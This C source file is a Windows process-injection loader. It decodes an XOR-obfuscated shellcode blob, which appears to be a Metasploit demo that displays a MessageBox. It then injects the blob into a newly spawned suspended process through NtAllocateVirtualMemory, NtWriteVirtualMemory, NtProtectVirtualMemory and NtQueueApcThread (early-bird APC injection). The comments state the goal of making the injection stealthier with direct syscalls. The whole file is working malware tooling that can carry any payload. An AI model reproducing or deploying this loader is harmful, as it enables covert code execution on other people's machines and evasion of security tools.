#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "syscalls.h"
#include "ntdll.h"


/* 
	To-Do:
	Make injection more stealthy
	Research required syscalls
		Research NtCreateUserProcess
	Implement Direct Syscalls
*/

/*
	Required Syscalls:
	NtAllocateVirtualMemory
	NtWriteVirtualMemory
	NtCreateProcess
	NtQueueApcThread
	NtResumeThread
	NtClose

	RtlCreateProcessParametersEx
	RTL_USER_PROCESS_PARAMETERS

*/

// Debug Symbols
char ok[6] = "\n(+)";
char err[6] = "\n(-)";
char info[8] = "\t\n(*)";
char ar[12] = "---------->";

unsigned char joker[] = {"\xb6\x02\xcb\xae\xba\xb5\xb5\xb5\xa2\x9a\x4a\x4a\x4a\x0b\x1b\x0b\x1a\x18\x1b\x1c\x02\x7b\x98\x2f\x02\xc1\x18\x2a\x74\x02\xc1\x18\x52\x74\x02\xc1\x18\x6a\x74\x02\xc1\x38\x1a\x74\x02\x45\xfd\x00\x00\x07\x7b\x83\x02\x7b\x8a\xe6\x76\x2b\x36\x48\x66\x6a\x0b\x8b\x83\x47\x0b\x4b\x8b\xa8\xa7\x18\x0b\x1b\x74\x02\xc1\x18\x6a\x74\xc1\x08\x76\x02\x4b\x9a\x74\xc1\xca\xc2\x4a\x4a\x4a\x02\xcf\x8a\x3e\x25\x02\x4b\x9a\x1a\x74\xc1\x02\x52\x74\x0e\xc1\x0a\x6a\x03\x4b\x9a\xa9\x16\x02\xb5\x83\x74\x0b\xc1\x7e\xc2\x02\x4b\x9c\x07\x7b\x83\x02\x7b\x8a\xe6\x0b\x8b\x83\x47\x0b\x4b\x8b\x72\xaa\x3f\xbb\x74\x06\x49\x06\x6e\x42\x0f\x73\x9b\x3f\x9c\x12\x74\x0e\xc1\x0a\x6e\x03\x4b\x9a\x2c\x74\x0b\xc1\x46\x02\x74\x0e\xc1\x0a\x56\x03\x4b\x9a\x74\x0b\xc1\x4e\xc2\x02\x4b\x9a\x0b\x12\x0b\x12\x14\x13\x10\x0b\x12\x0b\x13\x0b\x10\x02\xc9\xa6\x6a\x0b\x18\xb5\xaa\x12\x0b\x13\x10\x74\x02\xc1\x58\xa3\x03\xb5\xb5\xb5\x17\x03\x8d\x8b\x4a\x4a\x4a\x4a\x74\x02\xc7\xdf\xb4\x4a\x4a\x4a\x74\x06\xc7\xcf\x45\x4b\x4a\x4a\x02\x7b\x83\x0b\xf0\x0f\xc9\x1c\x4d\xb5\x9f\x02\x7b\x83\x0b\xf0\xba\xff\xe8\x1c\xb5\x9f\x02\x2f\x26\x26\x25\x66\x6a\x2c\x38\x25\x27\x6a\x07\x19\x0c\x6b\x4a\x07\x2f\x39\x39\x2b\x2d\x2f\x08\x25\x32\x4a\x4a"};
SIZE_T joker_len = sizeof(joker);
char key = 'J';

int main(int argc, char* argv[]) {
	
	if (argc != 2 || argv[1] == NULL) {
		printf("%s Usage: %s <process name>", err, argv[0]);
		return EXIT_FAILURE;
	}

	//HANDLE hProc, hThread;
	OBJECT_ATTRIBUTES objectAtrributes = { sizeof(objectAtrributes) };
	const char* procname = argv[1];
	//const char* procname = "notepad.exe";
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	VOID* pBaseAddress = NULL;
	ULONG previousSuspend;
	ULONG oldProtect;
	NTSTATUS status;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Decode p load
	printf("%s Decoding p load...", ok);
	int i = 0;
	for (i; i < sizeof(joker) - 1; i++)
	{
		joker[i] = joker[i] ^ key;
	}
	
	printf("%s Creating instance of %s in suspended state...", ok, procname);
	// Create a process in a suspended state
	if (!CreateProcessA(0, (LPSTR)procname, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
		printf("%s CreateProcessA() %s Failed to spawn %s, error: %ld", err, ar, procname, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s %s spawned in suspended state.", ok, procname);

	// NtCreateUserProcess()
	//UNICODE_STRING NtImagePath;
	//RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\calc.exe");

	//PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	//RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	//PS_CREATE_INFO CreateInfo = { 0 };
	//CreateInfo.Size = sizeof(CreateInfo);
	//CreateInfo.State = PsCreateInitialState;

	//PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	//AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	//AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	//AttributeList->Attributes[0].Size = NtImagePath.Length;
	//AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	//status = NtCreateUserProcess(&hProc, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
	//if (status != 0) {
	//	printf("%s NtCreateUserProcess() %s Failed to create process %s %x", err, ar, ar, status);
	//	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	//	RtlDestroyProcessParameters(ProcessParameters);
	//	return EXIT_FAILURE;
	//}
	//printf("%s Process created...", ok);

	// Allocate
	status = NtAllocateVirtualMemory(pi.hProcess, &pBaseAddress, 0, &joker_len, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		printf("%s NtAllocateVirtualMemory() %s Failed to allocate %zu byes of memory %s Status: %x", err, ar, sizeof(joker), ar, status);
		NtClose(pi.hProcess);
		NtClose(pi.hThread);
		return EXIT_FAILURE;
	}
	printf("%s NtAllocateVirtualMemory() %s Allocated %zu bytes in process %s 0x%p", ok, ar, sizeof(joker), ar, pBaseAddress);

	// Copy
	/*if (!WriteProcessMemory(pi.hProcess, pBaseAddress, joker, sizeof(joker), NULL)) {
		printf("%s WriteProcessMemory() %s Failed to write to memory, error: %ld", err, ar, GetLastError());
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return EXIT_FAILURE;
	}
	printf("%s WriteProcessMemory() %s Wrote %zu bytes in %s %s 0x%p", ok, ar, sizeof(joker), procname, ar, pBaseAddress);*/

	status = NtWriteVirtualMemory(pi.hProcess, pBaseAddress, joker, sizeof(joker), &joker_len);
		if (status != 0) {
			printf("%s NtWriteVirtualMemory() %s Failed to write %zu bytes to memory at 0x%p, status: %x", err, ar, sizeof(joker), pBaseAddress, status);
			NtClose(pi.hThread);
			NtClose(pi.hProcess);
			return EXIT_FAILURE;
	}
	printf("%s NtWriteVirtualMemory() %s Wrote %zu bytes to memory %s 0x%p", ok, ar, sizeof(joker), ar, pBaseAddress);


	status = NtProtectVirtualMemory(pi.hProcess, &pBaseAddress, &joker_len, PAGE_EXECUTE_READ, &oldProtect);
	if (status != 0) {
		printf("%s NtProtectVirtualMemory() %s Failed to change memory protection at 0x%p %s Status: %x", err, ar, pBaseAddress, ar, status);
		NtClose(pi.hProcess);
		NtClose(pi.hThread);
		return EXIT_FAILURE;
	}
	printf("%s NtProtectVirtualMemory() %s Changed protection on %zu bytes %s 0x%p", ok, ar, sizeof(joker), ar, pBaseAddress);

	// Queue Execution
	//printf("%s Queueing execution %s 0x%p", ok, ar, pBaseAddress);
	//if (QueueUserAPC((PAPCFUNC)pBaseAddress, pi.hThread, NULL) == 0) { // QueueUserAPC returns a non-zero value if successful
	//	printf("%s QueueUserAPC() %s Failed to queue execution, error: %ld", err, ar, GetLastError());
	//}
	//printf("%s QueueUserAPC() %s Queued execution %s 0x%p", ok, ar, ar, pBaseAddress);

	status = NtQueueApcThread(pi.hThread, (PPS_APC_ROUTINE)pBaseAddress, NULL, NULL, NULL);
	if (status != 0) {
		printf("%s NtQueueApcThread() %s Failed to queue APC thread %s Status: %x", err, ar, ar, status);
		NtClose(pi.hThread);
		NtClose(pi.hProcess);
		return EXIT_FAILURE;
	}
	printf("%s NtQueueApcThread() %s Queued APC thread...", ok, ar);

	// Resume Thread
	printf("%s NtresumeThread() $s Resuming thread...", ok, ar);
	/*ResumeThread(pi.hThread);*/
	status = NtResumeThread(pi.hThread, &previousSuspend);
	if (status != 0) {
		printf("%s NtResumeThread() %s Failed to resume thread %s Status: %x", err, ar, ar, status);
		NtClose(pi.hThread);
		NtClose(pi.hProcess);
		return EXIT_FAILURE;
	}

	printf("%s NtClose() %s Closing handles", ok, ar);
	NtClose(pi.hProcess);
	NtClose(pi.hThread);

	return EXIT_SUCCESS;
}